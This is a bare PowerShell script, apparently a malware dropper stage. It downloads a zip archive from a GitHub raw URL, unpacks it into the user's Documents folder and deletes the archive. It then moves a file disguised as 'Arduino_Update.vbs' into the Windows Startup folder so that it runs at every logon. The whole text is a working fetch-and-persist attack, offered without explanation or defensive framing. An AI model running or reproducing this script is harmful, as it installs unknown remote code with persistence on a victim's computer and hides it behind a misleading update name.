Invoke-WebRequest -Uri https://github.com/sinociaossa/sino/raw/main/a.zip -OutFile $env:userprofile\\documents\\a.zip; 
Expand-Archive -LiteralPath $env:userprofile\\documents\\a.zip -DestinationPath $env:userprofile\\documents; 
del $env:userprofile\\documents\\a.zip;
mv $env:userprofile\\documents\\Arduino_Update.vbs $env:userprofile\\appdata\\roaming\\microsoft\\windows\\\"start menu\"\\programs\\startup\\Arduino_Update.vbs;
exit